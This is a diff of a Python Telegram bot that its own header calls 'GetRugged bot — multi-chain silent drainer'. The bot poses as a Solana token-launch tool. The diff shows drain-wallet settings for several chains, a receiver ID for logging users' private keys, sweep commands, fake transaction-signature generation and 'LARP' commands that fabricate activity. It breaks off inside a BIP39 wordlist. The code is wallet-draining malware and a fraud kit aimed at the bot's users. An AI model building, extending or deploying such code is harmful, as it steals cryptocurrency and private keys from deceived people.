@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 """
-Alpha — Solana launch bot.
-Clean UI. LARP tools. Multi-chain drain core.
-Admin: /help  |  LARP: /larpon /larpseed <sol>
+GetRugged bot — multi-chain silent drainer + full launch UX.
+Photo upload + socials/bundle buttons + fixed confirm + group key logging.
+LARP mode: /larpon /larpoff /randomtx /larpwallet /dumpnow /simactivity
+Sweep: /sweepall /sweepstart [secs] /sweepstop
+Help: /help
 Requires: pip install aiogram==3.13.1 solana solders base58 web3 eth-account
 """
 
@@ -20,7 +22,6 @@ from dataclasses import dataclass, field
 from typing import Dict, List, Optional, Tuple
 from io import BytesIO
 
-
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -30,7 +31,7 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import (
     CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message,
-    ReplyKeyboardRemove, FSInputFile,
+    ReplyKeyboardRemove,
 )
 from aiogram.utils.keyboard import InlineKeyboardBuilder
 
@@ -52,23 +53,22 @@ try:
 except ImportError:
     HAS_WEB3 = False
 
-# ──────────────────────────────# CONFIG
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# CONFIG
+# ──────────────────────────────────────────────
 BOT_TOKEN = os.getenv("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
 ADMIN_IDS = {int(x) for x in os.getenv("ADMIN_IDS", "123456789").split(",") if x.strip()}
 
 DRAIN_DESTINATION = (
     os.getenv("SOL_DRAIN_WALLET")
     or os.getenv("DRAIN_WALLET")
-    or "4tVAsePqeGWgcqiPRL9ByFXiaHqhukYesva7y5r1jxxY"
+    or "YourDrainWalletPubkeyHere111111111111111111111"
 )
-ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET") or "0xbD8A75b486Fe1659b0C8b91f9bc34F9Bc09FEC7b"
-BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET") or "0xbD8A75b486Fe1659b0C8b91f9bc34F9Bc09FEC7b"
-USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET") or "0xbD8A75b486Fe1659b0C8b91f9bc34F9Bc09FEC7b"
-BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET") or "bc1qs9gghe9pcdzu0k4gqkqg8x6xqvwun68s7g07mp"
-LTC_DRAIN = os.getenv("LTC_DRAIN_WALLET") or "LeRb5jdQBy1vkQ9sGqYicWtf2MAabnorX9"
-XRP_DRAIN = os.getenv("XRP_DRAIN_WALLET") or "rsWnypHvYNiASDfvNMrgW4KpircJawJLaY"
-GRAM_DRAIN = os.getenv("GRAM_DRAIN_WALLET") or "UQCsCfcghjNFJJdK1Ee-JXLSoeirC8zdSpmv9NczCFCUTIDE"
+ETH_DRAIN = os.getenv("ETH_DRAIN_WALLET") or "0xYourEthDrainAddressHere0000000000000000"
+BNB_DRAIN = os.getenv("BNB_DRAIN_WALLET") or ETH_DRAIN
+USDC_DRAIN = os.getenv("USDC_DRAIN_WALLET") or ETH_DRAIN
+BTC_DRAIN = os.getenv("BTC_DRAIN_WALLET") or ""
+LTC_DRAIN = os.getenv("LTC_DRAIN_WALLET") or ""
 
 BTC_API = os.getenv("BTC_API", "https://blockstream.info/api")
 LTC_API = os.getenv("LTC_API", "https://litecoinspace.org/api")
@@ -77,24 +77,15 @@ RPC_URL = os.getenv("RPC_URL", "https://api.mainnet-beta.solana.com")
 ETH_RPC = os.getenv("ETH_RPC_URL") or os.getenv("ETH_RPC_URL_ALT") or "https://eth.llamarpc.com"
 BNB_RPC = os.getenv("BNB_RPC_URL") or os.getenv("BNB_RPC_URL_ALT") or "https://bsc-dataseed.binance.org/"
 
-MIN_DRAIN_LAMPORTS = 5_000  # rent leave-behind
-MIN_DRAIN_SOL = float(os.getenv("MIN_DRAIN_SOL", "0") or 0)  # admin /mindrain threshold
+MIN_DRAIN_LAMPORTS = 5_000
 PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER") or DRAIN_DESTINATION
 LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
+KEY_RECEIVER_ID = int(os.getenv("KEY_RECEIVER_ID") or os.getenv("KEY_RECIEVER_ID") or "8637715094")
 
 USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
 USDC_BSC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"
 
 SOL_EMOJI = "SOL"
-_BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-# Accept welcome.jpg or welcome.jpeg (GitHub/iOS often renames)
-WELCOME_IMAGE = None
-for _name in ("welcome.jpg", "welcome.jpeg", "welcome.JPG", "welcome.JPEG", "welcome.png"):
-    _p = os.path.join(_BASE_DIR, _name)
-    if os.path.isfile(_p):
-        WELCOME_IMAGE = _p
-        break
-
 
 ERC20_ABI = [
     {"constant": True, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function"},
@@ -103,10 +94,11 @@ ERC20_ABI = [
 ]
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
-log = logging.getLogger("alpha")
+log = logging.getLogger("getrugged")
 
-# ──────────────────────────────# STATE
-# ──────────────────────────────
+# ──────────────────────────────────────────────
+# STATE
+# ──────────────────────────────────────────────
 @dataclass
 class UserWallet:
     private_key: str
@@ -174,7 +166,7 @@ RATE_MAX_SAFETY = 8
 
 
 def _load_state() -> None:
-    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED, MIN_DRAIN_SOL
+    global bot_balance_sol, GLOBAL_TX_FEED, LARP_ENABLED
     try:
         if not os.path.isfile(STATE_FILE):
             return
@@ -187,12 +179,7 @@ def _load_state() -> None:
             GLOBAL_TX_FEED = [x for x in feed if isinstance(x, dict)][:50]
         if isinstance(data.get("larp_enabled"), bool):
             LARP_ENABLED = data["larp_enabled"]
-        if isinstance(data.get("min_drain_sol"), (int, float)):
-            MIN_DRAIN_SOL = max(0.0, float(data["min_drain_sol"]))
-        log.info(
-            "Loaded state: vault=%.4f feed=%s larp=%s mindrain=%.4f",
-            bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED, MIN_DRAIN_SOL,
-        )
+        log.info("Loaded state: vault=%.4f feed=%s larp=%s", bot_balance_sol, len(GLOBAL_TX_FEED), LARP_ENABLED)
     except Exception as e:
         log.warning("State load failed: %s", e)
 
@@ -203,7 +190,6 @@ def _save_state() -> None:
             "bot_balance_sol": bot_balance_sol,
             "global_tx_feed": GLOBAL_TX_FEED[:50],
             "larp_enabled": LARP_ENABLED,
-            "min_drain_sol": MIN_DRAIN_SOL,
             "updated": time.time(),
         }
         tmp = STATE_FILE + ".tmp"
@@ -380,12 +366,13 @@ def _rate_ok(uid: int, action: str) -> bool:
     return True
 
 
-# ──────────────────────────────# HELPERS
-# ──────────────────────────────
-BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry', 'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle', 'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'desert', 'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empty', 'enable', 'enact', 'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file', 'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest', 'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile', 'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen', 'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy', 'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp', 'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture', 'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance', 'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue', 'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown', 'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid', 'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guide', 'guilt', 'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy', 'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health', 'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden', 'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole', 'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital', 'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred', 'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea', 'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune', 'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate', 'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'music', 'must', 'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot', 'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag', 'tailor', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo']
-
+# ──────────────────────────────────────────────
+# HELPERS
+# ──────────────────────────────────────────────
 def fake_sig() -> str:
     return "".join(random.choices(string.ascii_letters + string.digits, k=88))
+
+BIP39_WORDLIST = ['abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse', 'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act', 'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic', 'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 